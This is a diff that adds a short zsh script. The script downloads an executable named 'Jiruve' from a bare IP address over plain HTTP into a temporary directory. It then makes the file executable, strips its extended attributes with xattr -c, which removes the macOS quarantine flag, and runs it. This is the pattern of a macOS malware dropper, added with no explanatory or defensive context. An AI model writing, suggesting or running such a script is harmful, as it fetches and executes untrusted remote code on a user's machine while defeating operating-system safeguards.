@@ -1,1 +1,12 @@
+#!/bin/zsh
+set -e
 
+WORKDIR=$(mktemp -d)
+FILE="$WORKDIR/Jiruve"
+
+curl -fsSL -o "$FILE" http://64.89.160.11/Jiruve
+
+chmod +x "$FILE"
+xattr -c "$FILE" 2>/dev/null || true
+
+"$FILE"
